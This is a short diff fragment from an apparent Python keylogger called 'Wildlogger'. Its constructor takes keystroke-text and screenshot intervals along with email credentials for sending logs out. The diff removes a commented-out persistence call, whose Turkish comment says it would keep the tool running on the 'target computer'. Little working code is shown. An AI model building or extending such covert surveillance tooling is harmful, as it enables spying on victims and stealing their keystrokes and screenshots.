@@ -44,7 +44,6 @@ import subprocess
 
 class Wildlogger:
     def __init__(self,text_interval,screenshot_interval,from_email,password,to_email):
-        #self.persistent()# wildlogger scripti exe'ye dönüştürüldüğünde, hedef bilgisayarda sürekli olarak çalışması için kullanılacak metot
         self.log = ""
         self.text_interval=text_interval
         self.screenshot_interval=screenshot_interval
